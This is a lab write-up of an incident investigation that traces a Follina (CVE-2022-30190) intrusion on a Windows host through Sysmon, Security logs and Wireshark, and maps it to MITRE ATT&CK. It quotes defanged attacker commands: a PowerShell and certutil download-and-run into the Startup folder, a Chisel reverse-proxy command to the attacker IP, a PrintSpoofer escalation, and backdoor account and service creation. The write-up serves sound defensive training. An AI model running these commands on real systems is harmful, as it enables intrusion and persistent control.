# Tempest – Incident Investigation: Malicious Document to Full System Compromise

**Scenario:** a SOC analyst reported an intrusion on a Windows machine (`TEMPEST`, victim user `benimaru`) that started with a malicious `.doc` file. The task is to rebuild the whole attack from three evidence files and map it to the attack lifecycle: initial access → execution → persistence → discovery → privilege escalation → account creation and persistence → C2.

**Tip:** all IOCs below are **defanged** (`phishteam[.]xyz`, `hxxp://`). That means the dots and the protocol are broken on purpose so nobody clicks them by accident or triggers an automatic lookup. Always defang IOCs in reports. Re-fang them only when you need to search them.

## Evidence and Tools

| Evidence file | What it is |
|---|---|
| `capture.pcapng` | Network capture (read in Wireshark) |
| `sysmon.evtx` | Sysmon event log (process, file, DNS and network activity) |
| `windows.evtx` | Windows Security event log (account and group changes) |

| Tool | Used for |
|---|---|
| **PowerShell `Get-FileHash`** | Hashing the evidence files first (SHA256) to prove they weren't changed |
| **Event log viewer (Timeline Explorer style table)** | Filtering the `.evtx` logs. The screenshots show columns like Payload Data and Executable Info, which look like parsed log output |
| **Wireshark** | Reading the HTTP traffic and C2 communication |
| **CyberChef** | Decoding Base64 strings |
| **VirusTotal** | Identifying tools from file hashes |

**Good practice:** hash the evidence before analysis. It proves the files weren't altered (chain of custody).

## Attack at a Glance

<img width="758" height="2179" alt="tempest_attack_chain" src="https://github.com/user-attachments/assets/d12117d1-5584-4432-8739-2305b85b84bf" />


## Glossary (terms used below)

| Term | Meaning |
|---|---|
| **Follina (CVE-2022-30190)** | A Microsoft Office flaw. A document can make Windows' **MSDT** (support diagnostic tool) run commands with no macros needed |
| **MSDT (`msdt.exe`)** | Microsoft Support Diagnostic Tool. Opens through the `ms-msdt:` link type. Abused here to run PowerShell |
| **LOLBin** | "Living Off the Land Binary": a legitimate Windows program abused by attackers (here `msdt.exe`, `certutil.exe`, `powershell.exe`) |
| **Mark of the Web / `Zone.Identifier`** | A small hidden stream Windows adds to files downloaded from the internet. Seeing `file.doc:Zone.Identifier` in a file-create event proves the file came from a download |
| **Base64** | A way of encoding data as plain text. Attackers use it to hide commands. Decode it in CyberChef (**From Base64**) |
| **Startup folder** | Programs in `...\Start Menu\Programs\Startup` run automatically when the user logs in (persistence) |
| **Beaconing (C2)** | The infected machine regularly "checks in" with the attacker's server to ask for commands |
| **Reverse SOCKS proxy** | The victim connects **out** to the attacker, who can then route his own traffic **through** the victim into the internal network |
| **Chisel** | A tunnelling tool (hacking tool) used to create that reverse proxy |
| **WinRM** | Windows Remote Management. Lets you run commands on another machine. Listens on port **5985** (HTTP) and **5986** (HTTPS) |
| **`wsmprovhost.exe`** | The process Windows starts for an incoming WinRM session. Seeing it spawn means someone logged in remotely via WinRM |
| **PrintSpoofer** | A privilege escalation tool. Tricks a Windows service into connecting to the attacker's program, then steals that **SYSTEM** token |
| **SeImpersonatePrivilege** | A privilege that lets a process act as another user. Service accounts often have it, and PrintSpoofer abuses it to become SYSTEM |
| **SYSTEM** | The highest-privilege account on Windows, higher than Administrator |
| **Nim** | A programming language. Attackers use it because security tools detect it less often |

## Sysmon and Windows Event IDs Used

| Event | Log | Meaning | Used to find |
|---|---|---|---|
| **1** | Sysmon | Process creation (includes parent process, command line, hashes) | Word, msdt, PowerShell, certutil, tools |
| **3** | Sysmon | Network connection | Ports and IPs used by `final.exe` |
| **11** | Sysmon | File created | The downloaded `.doc`, `update.zip` |
| **22** | Sysmon | DNS query | Domain to IP resolution |
| **4720** | Security | User account created | Backdoor accounts |
| **4732** | Security | Member added to a security-enabled local group | Account added to Administrators |

Tip: **only Event ID 1 records file hashes**, so use it when asked for the hash of a program.

## Phase 1: Initial Access – Malicious Document

**What was known:** a `.doc` file, downloaded through `chrome.exe`, then a chain of commands ran.

| Question | How it was found | Finding |
|---|---|---|
| Document name | Filter Sysmon **Event 11** (file create) where the image is `chrome.exe`, scroll right to the target filename | `free_magicules.doc` (also shown as `free_magicules.doc:Zone.Identifier`, proof it was downloaded) |
| Victim user and machine | Same event, scroll left to the computer and user columns | `TEMPEST\benimaru` on `TEMPEST` |
| Word process PID | Filter user `benimaru` + **Event 1** + executable info for `WINWORD.EXE` opening the document | **PID 496** |
| IP of the malicious domain | Filter **Event 22** (DNS) for PID 496 | `phishteam[.]xyz` resolved to `167[.]71[.]199[.]191` (shown as the IPv4-mapped IPv6 form `::ffff:167.71.199.191`) |
| Base64 payload | Filter **Event 1** where the **parent PID is 496** (the parent PID is in the Payload Data column). The child is `msdt.exe` | Command shows `msdt.exe ms-msdt:/id PCWDiagnostic ... IT_BrowseForFile=$(Invoke-Expression(...FromBase64String(...)))` |
| CVE | Researching the `msdt` / `ms-msdt` behavior | **CVE-2022-30190 (Follina)** |

**Why this works:** the document makes Word load a remote resource that launches `msdt.exe`, which runs the hidden PowerShell. The path trick `../../../Windows/System32/mpsigstub.exe` at the end of the command is part of the exploit string.

**Decoded Base64 (CyberChef):**
```powershell
$app=[Environment]::GetFolderPath('ApplicationData');
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup";
iwr hxxp://phishteam[.]xyz/02dcf07/update.zip -outfile update.zip;
Expand-Archive .\update.zip -DestinationPath .;
rm update.zip;
```

| Line | What it does |
|---|---|
| `GetFolderPath('ApplicationData')` | Finds the user's `AppData\Roaming` folder |
| `cd ...\Startup` | Goes into the Startup folder |
| `iwr ... -outfile update.zip` | `iwr` = `Invoke-WebRequest`. Downloads the zip |
| `Expand-Archive` | Unzips it in the Startup folder |
| `rm update.zip` | Deletes the zip to reduce traces |

## Phase 2: Stage 2 Execution and Persistence

| Question | How it was found | Finding |
|---|---|---|
| File written by the payload | Sysmon **Event 11** where the target filename contains `Startup` | `C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.zip` (an `update.lnk` shortcut also appears in that folder) |
| Command run at login | Filter parent process `explorer.exe` + user `benimaru` + **Event 1** | A hidden PowerShell that downloads and runs `first.exe` (below) |
| Hash of the stage 2 binary | **Event 1** where the child process is `first.exe` | SHA256 shown in the event (Event 1 records hashes) |
| C2 domain and port | Set the parent process to `first.exe`, look at its **DNS (22)** and network events, confirm in Wireshark | `resolvecyber[.]xyz`, port **80** |

**Why `explorer.exe` is the parent:** items in the Startup folder are launched by `explorer.exe` when the user logs in. Filtering on that parent is how you spot autostart execution.

**Command run at every login:**
```
powershell.exe -w hidden -noni certutil -urlcache -split -f 'hxxp://phishteam[.]xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
```

| Part | Meaning |
|---|---|
| `-w hidden` | Hidden window |
| `-noni` | Non-interactive |
| `certutil -urlcache -split -f <url> <file>` | LOLBin download |
| `; C:\Users\Public\Downloads\first.exe` | Runs the file after downloading |

**Persistence mechanism:** Startup folder. The payload comes back every time `benimaru` logs in.

## Phase 3: Network Traffic (Wireshark)

**Files pulled from the attacker's server** (filter `http.host == "phishteam.xyz" && http.request.method == "GET"`, all from `167[.]71[.]199[.]191`):

| Seconds into capture | File requested | Purpose |
|---|---|---|
| ~89 | `/02dcf07/free_magicules.doc` | The malicious document |
| ~125 and ~131 | `/02dcf07/index.html`, `/02dcf07/update.zip` | Follina HTML page, startup payload |
| ~225 and ~226 | `/02dcf07/first.exe` | Stage 2 (requested twice, by two tools) |
| ~370 | `/02dcf07/ch.exe` | **Chisel** tunnelling tool |
| ~524 | `/02dcf07/spf.exe` | **PrintSpoofer** privilege escalation |
| ~580 | `/02dcf07/final.exe` | Final C2 binary |

**Reading the order:** the files show the attack stages in sequence. Document → payload → stage 2 → tunnel → privilege escalation → final backdoor.

**C2 traffic** (filter `http.host == "resolvecyber.xyz"`, server `167[.]71[.]222[.]162`):

| Question | Finding |
|---|---|
| URL the binary asks for commands | `/9ab62b5` |
| HTTP method | **GET** |
| Parameter carrying command results | **`q`** (e.g. `/9ab62b5?q=...`) |
| Encoding of the data | **Base64** (decode the `q=` value in CyberChef and you get the commands and output that Sysmon also showed) |
| Language used to compile the binary | **Nim** (User-Agent: `Nim httpclient/1.6.6`) |

````text
Victim (TEMPEST)                         C2 server (resolvecyber.xyz)
      |                                              |
      |---- GET /9ab62b5 ------------------------->  |   any commands for me?
      |<--- command to run ------------------------  |
      |---- GET /9ab62b5?q=<Base64 output> -------->  |   results of the command
      |                                              |
      |        (repeats every few seconds)           |
````

**Detection ideas:** an unusual User-Agent (`Nim httpclient`), a repeated request to the same short path, and long Base64 values in a URL parameter.

## Phase 4: Discovery (Internal Reconnaissance)

Everything the attacker typed is hidden in Base64 inside the `q=` values and also visible in Sysmon. Decoding them (or reading Event 1 children of `first.exe`) shows:

| Command | What it does | Why the attacker ran it |
|---|---|---|
| `whoami` / `whoami /priv` | Shows current user and privileges | Find out what access he has |
| `net user benimaru`, `net users` | User account details | Learn about accounts |
| `net localgroup administrators` | Lists local admins | See who has admin rights |
| `cat ...\Desktop\automation.ps1` | Reads a script on the user's desktop | **Found hardcoded credentials** for `TEMPEST\benimaru` inside it |
| `netstat -ano -p tcp` | Lists listening ports | Finds services he can reach |

**Key findings:**
- The file `automation.ps1` contained a **plaintext password** for the user. Credentials left in scripts are a very common mistake
- `netstat` showed port **5985** listening, the default **WinRM** HTTP port, which gives remote command execution

## Phase 5: Pivoting – Reverse SOCKS Proxy and WinRM

**Command run by `first.exe`:**
```
C:\Users\benimaru\Downloads\ch.exe client 167[.]71[.]199[.]191:8080 R:socks
```

| Part | Meaning |
|---|---|
| `ch.exe` | The downloaded tunnelling tool |
| `client <ip>:8080` | Connect out to the attacker's server on port 8080 |
| `R:socks` | **Reverse SOCKS proxy**: the attacker can now send traffic into the victim's internal network through this connection |

| Question | Finding |
|---|---|
| Tool name | **Chisel** (hash of `ch.exe` pasted into VirusTotal, flagged by 49 vendors, shown as `chisel.exe`) |
| Service used to log in | **WinRM**. Right after the proxy started, `wsmprovhost.exe -Embedding` appeared, which Windows launches for remote WinRM sessions |

**Why this matters:** the attacker can't reach port 5985 directly from outside. The reverse proxy "brings" his machine inside, and he logs in over WinRM with the stolen password.

**From here on, the parent process of the attacker's commands is `wsmprovhost.exe`**, a quick way to tell WinRM-launched activity from the earlier `first.exe` activity.

## Phase 6: Privilege Escalation

| Question | Finding |
|---|---|
| Discovered privilege | `whoami /priv` run through the WinRM session |
| Binary downloaded for escalation | `spf.exe` (hash checked on VirusTotal) |
| Tool | **PrintSpoofer** (VirusTotal: `PrintSpoofer64.exe`, 52 vendors flagged) |
| Privilege it abuses | **SeImpersonatePrivilege** |
| What it runs | `spf.exe -c C:\ProgramData\final.exe` |
| Second binary | `final.exe` (downloaded to `C:\ProgramData\` with `iwr`) |

**How it works:** PrintSpoofer goes from `LOCAL/NETWORK SERVICE` to **SYSTEM** on Windows 10 and Server 2016/2019. `-c` tells it which command to run as SYSTEM, here the backdoor `final.exe`.

**C2 from `final.exe`:**
- It resolves `resolvecyber[.]xyz` again (Sysmon Events 22 and 3 filtered on `final.exe`)
- In Wireshark, filter `ip.dst == 167[.]71[.]222[.]162` (re-fang before using) and add **Destination Port** as a column: traffic to port **80** (first C2) and a new port **8080**
- **Answer:** `final.exe` uses port **8080**

**Tip:** after escalation the process runs as SYSTEM, so **remove your user filter** (`benimaru`) when searching.

## Phase 7: Actions on Objective – Backdoor Accounts and Persistence

### New users
Filter **Event 1** where the parent process is `net.exe`. Many post-compromise commands appear.

| Item | Finding |
|---|---|
| Accounts created | **`shion`** and **`shuna`** |
| Failed attempts first | The `net user` commands failed until the **`/add`** switch was included |
| Event for account creation | **4720** (Windows Security log) |
| Account promoted | `net localgroup administrators /add shion` (shown as `net1` in the log) |
| Event for the group change | **4732** |

**Note on `net1.exe`:** `net.exe` hands the real work to `net1.exe`, so you may see `net1` in command lines even though the attacker typed `net`.

### Service persistence
```
sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
```

| Part | Meaning |
|---|---|
| `sc.exe create` | Creates a Windows service |
| `binpath= C:\ProgramData\final.exe` | The program the service runs (the backdoor) |
| `start= auto` | Starts automatically at boot |

- Two services were attempted: `TempestUpdate` and `TempestUpdate2`
- Only **`TempestUpdate2`** has **registry events** in the logs, which confirms it was actually created
- This gives persistent access **as SYSTEM**, which survives reboots and doesn't depend on the user logging in

## IOC Summary

| Type | Value |
|---|---|
| Malicious document | `free_magicules.doc` |
| Delivery domain | `phishteam[.]xyz` (`167[.]71[.]199[.]191`) |
| Payload path | `/02dcf07/` (update.zip, first.exe, ch.exe, spf.exe, final.exe) |
| C2 domain | `resolvecyber[.]xyz` (`167[.]71[.]222[.]162`), ports 80 and 8080 |
| C2 path / parameter | `/9ab62b5`, `?q=` |
| Chisel tunnel | `ch.exe client 167[.]71[.]199[.]191:8080 R:socks` |
| User-Agent | `Nim httpclient/1.6.6` |
| Tools dropped | `first.exe`, `ch.exe` (Chisel), `spf.exe` (PrintSpoofer), `final.exe` |
| Backdoor accounts | `shion`, `shuna` |
| Persistence | Startup folder (`update.zip` / `update.lnk`), services `TempestUpdate` and `TempestUpdate2` |
| CVE | CVE-2022-30190 (Follina) |

## MITRE ATT&CK Mapping

| Stage | Technique | ID |
|---|---|---|
| Initial access / execution | User Execution: Malicious File | T1204.002 |
| Exploit | Exploitation for Client Execution (Follina) | T1203 |
| Execution | PowerShell | T1059.001 |
| Obfuscation | Obfuscated Files or Information (Base64) | T1027 |
| Tool download | Ingress Tool Transfer (`iwr`, `certutil`) | T1105 |
| Persistence | Startup Folder | T1547.001 |
| Discovery | System Owner/User Discovery, Account and Group Discovery | T1033, T1087, T1069 |
| Discovery | System Network Connections Discovery (`netstat`) | T1049 |
| Credential access | Credentials in Files | T1552.001 |
| C2 | Web Protocols, Standard Encoding | T1071.001, T1132.001 |
| Pivoting | Proxy, Protocol Tunneling (Chisel) | T1090, T1572 |
| Lateral movement | Remote Services: WinRM | T1021.006 |
| Privilege escalation | Token Impersonation (PrintSpoofer) | T1134.001 |
| Persistence | Create Account: Local Account | T1136.001 |
| Persistence | Windows Service | T1543.003 |

## Key Takeaways
- **Follow the process tree.** Chrome → Word (PID 496) → msdt → PowerShell → first.exe → ch.exe is the whole story. Each step is found by filtering on the **parent process ID** of the previous one
- **Pick the right Sysmon event:** 11 for files, 22 for DNS, 1 for processes (and hashes), 3 for network connections
- **Pivot between logs:** Sysmon shows what ran, Wireshark shows how it talked, and CyberChef reveals what was hidden in Base64
- **Hash and identify tools:** unknown binaries can be named quickly by pasting their SHA256 into VirusTotal (Chisel, PrintSpoofer)
- **`wsmprovhost.exe` as a parent** = remote WinRM activity
- **`/add` matters:** `net user` and `net localgroup` only create or add accounts when `/add` is present, and failed attempts are visible in the logs
- **Events 4720 and 4732** are the standard indicators for new accounts and admin group changes
- **Defences:** patch Office (Follina), disable the `ms-msdt` handler, block `certutil` downloads, alert on unusual User-Agents and on Startup folder writes, never keep passwords in scripts, and monitor new services and accounts
